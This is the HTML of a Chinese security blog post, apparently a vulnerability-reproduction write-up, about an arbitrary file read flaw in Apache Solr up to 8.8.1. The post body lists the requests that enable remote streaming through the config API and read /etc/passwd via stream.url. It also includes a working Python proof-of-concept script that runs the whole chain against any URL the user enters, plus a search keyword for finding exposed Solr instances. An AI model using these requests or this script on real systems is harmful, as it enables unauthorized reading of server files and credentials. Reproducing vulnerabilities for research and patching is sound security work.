@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>Apache Solr 任意文件读取漏洞 | Wisejay | To be better</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="漏洞复现">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Wisejay</h5>
+          <a href="mailto:1418084893@qq.com" title="1418084893@qq.com" class="mail">
+            
+              <span>1</span>
+            
+              <span>4</span>
+            
+              <span>1</span>
+            
+              <span>8</span>
+            
+              <span>0</span>
+            
+              <span>8</span>
+            
+              <span>4</span>
+            
+              <span>8</span>
+            
+              <span>9</span>
+            
+              <span>3</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                首页
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                关于
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>Apache Solr 任意文件读取漏洞</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">Apache Solr 任意文件读取漏洞</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-03-20T11:14:40.055Z" itemprop="datePublished" class="page-time">
+  2021-03-20
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/漏洞复现/">漏洞复现</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-Apache Solr 任意文件读取漏洞"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">Apache Solr 任意文件读取漏洞</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-03-20 19:14:40" datetime="2021-03-20T11:14:40.055Z"  itemprop="datePublished">2021-03-20</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/漏洞复现/">漏洞复现</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h1 id="Apache-Solr-任意文件读取漏洞"><a href="#Apache-Solr-任意文件读取漏洞" class="headerlink" title="Apache Solr 任意文件读取漏洞"></a>Apache Solr 任意文件读取漏洞</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Apache Solr &lt;= 8.8.1</p>
+<h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><p>app=”solr”</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="访问solr"><a href="#访问solr" class="headerlink" title="访问solr"></a>访问solr</h3><figure class="image-box">
+                <a rel=Apache Solr 任意文件读取漏洞 href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210319130320577.png" title="image-20210319130320577" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210319130320577.png" alt="image-20210319130320577" title class></a>
+                <p>image-20210319130320577</p>
+            </figure>
+
+<h3 id="获取core"><a href="#获取core" class="headerlink" title="获取core"></a>获取core</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/solr/admin/cores?indexInfo=false&amp;wt=json</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=Apache Solr 任意文件读取漏洞 href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210319130600572.png" title="image-20210319131444734" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210319130600572.png" alt="image-20210319131444734" title class></a>
+                <p>image-20210319131444734</p>
+            </figure>
+
+<h3 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#cityshopping-core为获取到的core</span></span><br><span class="line">/solr/cityshopping-core/config</span><br><span class="line"></span><br><span class="line"><span class="comment">#POST data</span></span><br><span class="line">&#123;<span class="string">"set-property"</span> : &#123;<span class="string">"requestDispatcher.requestParsers.enableRemoteStreaming"</span>:true&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=Apache Solr 任意文件读取漏洞 href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210319131202877.png" title="image-20210319130600572" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210319131202877.png" alt="image-20210319130600572" title class></a>
+                <p>image-20210319130600572</p>
+            </figure>
+
+<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#cityshopping-core为获取到的core</span></span><br><span class="line">/solr/sciencecenter-core/debug/dump?param=ContentStreams</span><br><span class="line"></span><br><span class="line"><span class="comment">#POST data</span></span><br><span class="line">stream.url=file:///etc/passwd</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=Apache Solr 任意文件读取漏洞 href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210319131444734.png" title="image-20210319131202877" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210319131444734.png" alt="image-20210319131202877" title class></a>
+                <p>image-20210319131202877</p>
+            </figure>
+
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(target)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">"---------正在验证漏洞--"</span>)</span><br><span class="line">        rep1 = requests.get(url=target+<span class="string">"solr/admin/cores?indexInfo=false&amp;wt=json"</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        core = list(json.loads(rep1.text)[<span class="string">'status'</span>])[<span class="number">0</span>]</span><br><span class="line">        print(<span class="string">"---------获取core成功----"</span>)</span><br><span class="line">        print(<span class="string">"---------尝试验证漏洞-------"</span>)</span><br><span class="line">        data2 = <span class="string">'&#123;"set-property" : &#123;"requestDispatcher.requestParsers.enableRemoteStreaming":true&#125;&#125;'</span></span><br><span class="line">        rep2 = requests.post(url=target+<span class="string">"solr/&#123;&#125;/config"</span>.format(core),timeout=<span class="number">10</span>,data=data2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"This"</span> <span class="keyword">in</span> rep2.text:</span><br><span class="line">            print(<span class="string">"---------尝试利用漏洞---------"</span>)</span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">            &#125;    </span><br><span class="line">            data3 = <span class="string">'stream.url=file:///etc/passwd'</span></span><br><span class="line">            rep3 = requests.post(url=target+<span class="string">"solr/&#123;&#125;/debug/dump?param=ContentStreams"</span>.format(core),data=data3,headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"root"</span> <span class="keyword">in</span> rep3.text:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"#########存在漏洞#########"</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"#########暂未发现漏洞#########"</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"#########暂未发现漏洞#########"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"#########暂未发现漏洞#########"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    url = str(input(<span class="string">"请输入你要验证的网站："</span>))</span><br><span class="line">    poc(url)</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://mp.weixin.qq.com/s/2D3bLaUVD6Lz7VqRu8dOGA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/2D3bLaUVD6Lz7VqRu8dOGA</a></p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2021-03-20T11:15:36.674Z" itemprop="dateUpdated">2021-03-20 19:15:36</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2021/03/20/Apache Solr 任意文件读取漏洞/" target="_blank" rel="external">http://wisejay.xyz/2021/03/20/Apache Solr 任意文件读取漏洞/</a>
+        
+    </div>
+    <footer>
+        <a href="http://wisejay.xyz">
+            <img src="/img/avatar.jpg" alt="Wisejay">
+            Wisejay
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.xyz/2021/03/20/Apache Solr 任意文件读取漏洞/&title=《Apache Solr 任意文件读取漏洞》 — Wisejay&pic=http://wisejay.xyz/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.xyz/2021/03/20/Apache Solr 任意文件读取漏洞/&title=《Apache Solr 任意文件读取漏洞》 — Wisejay&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2021/03/15/xsrc部署/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Xsrc安全应急响应中心部署</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Apache-Solr-任意文件读取漏洞"><span class="post-toc-number">1.</span> <span class="post-toc-text">Apache Solr 任意文件读取漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#影响范围"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">影响范围</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#关键字"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">关键字</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞复现"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">漏洞复现</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#访问solr"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">访问solr</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#获取core"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">获取core</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#验证漏洞"><span class="post-toc-number">1.3.3.</span> <span class="post-toc-text">验证漏洞</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#读取文件"><span class="post-toc-number">1.3.4.</span> <span class="post-toc-text">读取文件</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#POC"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">POC</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#参考文章"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">参考文章</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Wisejay &copy; 2019 - 2021
+            </span>
+        		
+           	
+            
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.xyz/2021/03/20/Apache Solr 任意文件读取漏洞/&title=《Apache Solr 任意文件读取漏洞》 — Wisejay&pic=http://wisejay.xyz/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.xyz/2021/03/20/Apache Solr 任意文件读取漏洞/&title=《Apache Solr 任意文件读取漏洞》 — Wisejay&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACvUlEQVR42u3ay07sQAwEUP7/p7nS3cKEKrsbEDpZjeaR9Mki7Sn77S0+3v8fH995dcx++/H7z2c+duDh4eGNlp5c8nkprxb3/GkOSH77yRnw8PDwrvHy0z3fmv3G83xz8zXj4eHh/QZe+6ukpH4+Gx4eHt7f4L0HR/6ITzDJ7cbDw8P7ft4mWm3L3zYUTsKRA1kLHh4eXsybhQU/+/pifw8PDw9v0VU/1ZpKYt/nEnl24OHh4d3gzS7Zjk8lMW478pVHGHh4eHj3eO1yk8CibYO1YwpJ4IuHh4d3ljfbBu6NC2wK+pf/GPDw8PCO8pICt22JJe/kDbPNOfHw8PBu8DanTuKAPKhtt5BoVXh4eHgXeJsmU8uLyt94WOG5iP+iAYaHh4d3iNdGsfvBgs301OF5MTw8PLySl//Vb0ejNm2zfMOIwmg8PDy8o7w2950ttG135SMFX3wHDw8P7wKvXUQewra/aj8tNhU8PDy8C7z9Izhh5MNV+ahBHVjg4eHhrXl5XNsmpW2InOOLjQEPDw/vGm/2J79tiW3C4mGQgYeHh3eNl7eX8ojh1OhAW2Tj4eHhfQ8vv+Qs56iXFdy44bgVHh4e3oLXxhDJ0MDsRmxC4ZfXxcPDw7vAmz3c25Z/8n7eBhsW5Xh4eHhHebOTziKMDT6/7hdhBB4eHt6C18ayp4ai8nh31WDDw8PDu8xrK9JNm6otzYc3CA8PD+8CL2nz54FFS3ou38/GKHh4eHineO/lMQsX2od4u7W8PDMeHh7eBd5mfin5dFOO5wHuCoaHh4c34rWbweabeRE/K9A/wePh4eFd482CiTakmEUV+ab1cmPAw8PD+yFe8s4s8E1uYoLHw8PD+528/aN/NuCVJwzDkhoPDw+v5LURQz2VUJbFm20GDw8P7zZv3wCbleD7kYL9bcXDw8Mref8AQAAiFrEozZIAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/haruto.model.json"},"display":{"position":"right","width":212,"height":472},"mobile":{"show":true},"log":false});</script></body>
+</html>
